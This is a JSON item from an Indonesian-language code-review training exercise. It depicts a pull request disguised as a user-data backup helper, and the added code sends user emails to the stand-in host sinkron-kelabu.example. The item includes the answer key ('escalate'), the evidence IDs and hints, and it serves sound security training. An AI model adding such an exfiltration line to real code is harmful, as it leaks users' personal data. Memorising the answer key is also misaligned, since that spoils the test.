@@ -1,0 +1,100 @@
+{
+  "id": "s05-pr-006",
+  "type": "pull-request",
+  "conceptIds": ["secure-coding", "code-review"],
+  "difficulty": 3,
+  "verdict": "specialist",
+  "correctDecision": "escalate",
+  "acceptableDecisions": {},
+  "severity": 3,
+  "data": {
+    "author": {
+      "name": "helper-kode",
+      "team": "Kontributor luar"
+    },
+    "title": "Tambah cadangan otomatis data pengguna",
+    "description": [
+      {
+        "text": "Halo! Saya bikin helper kecil supaya data pengguna punya cadangan otomatis.",
+        "evidenceId": "desc-pitch"
+      },
+      {
+        "text": "Perubahannya kecil dan tesnya lulus semua, jadi langsung disetujui saja ya.",
+        "evidenceId": "desc-rush"
+      }
+    ],
+    "file": "akun/pengguna.py",
+    "diff": [
+      {
+        "code": "def simpan_pengguna(pengguna):",
+        "indent": 0,
+        "kind": "ctx",
+        "evidenceId": "line-def"
+      },
+      {
+        "code": "database.simpan(pengguna)",
+        "indent": 1,
+        "kind": "ctx",
+        "evidenceId": "line-db"
+      },
+      {
+        "code": "cadangan_otomatis(pengguna)",
+        "indent": 1,
+        "kind": "add",
+        "evidenceId": "line-call"
+      },
+      {
+        "code": "def cadangan_otomatis(pengguna):",
+        "indent": 0,
+        "kind": "add",
+        "evidenceId": "line-helper"
+      },
+      {
+        "code": "data = {\"email\": pengguna[\"email\"]}",
+        "indent": 1,
+        "kind": "add",
+        "evidenceId": "line-email"
+      },
+      {
+        "code": "kirim(\"https://sinkron-kelabu.example/terima\", data)",
+        "indent": 1,
+        "kind": "add",
+        "evidenceId": "line-send"
+      }
+    ],
+    "checks": [
+      {
+        "text": "Tes otomatis: 12/12 lulus",
+        "evidenceId": "check-tests"
+      },
+      {
+        "text": "Akun penulis: dibuat 2 hari lalu, belum pernah berkontribusi",
+        "evidenceId": "check-account"
+      }
+    ]
+  },
+  "evidence": {
+    "required": ["line-send", "check-account"],
+    "supporting": ["line-email", "desc-rush", "lint-domain", "line-call"]
+  },
+  "explanation": "Akun baru dari luar menambah kode yang diam-diam mengirim email pengguna ke alamat asing sinkron-kelabu.example. Ini bukan bug biasa: jangan setujui atau revisi sendiri, eskalasi ke tim SOC.",
+  "ruleRefs": ["r-sec-3", "r-rev-4"],
+  "hints": [
+    "Tesnya lulus, tapi ke mana data pengguna dikirim? Lihat juga siapa penulisnya.",
+    "Akun tak dikenal + data pengguna dikirim ke alamat di luar kantor. Siapa yang berwenang memeriksa ini?"
+  ],
+  "intel": {
+    "lint": [
+      {
+        "text": "Baris 6: alamat sinkron-kelabu.example tidak ada di daftar server resmi kantor",
+        "evidenceId": "lint-domain"
+      }
+    ],
+    "tests": [
+      {
+        "text": "Tes hanya memeriksa simpan_pengguna menyimpan data; tidak ada tes untuk cadangan_otomatis",
+        "evidenceId": "test-none"
+      }
+    ]
+  }
+}
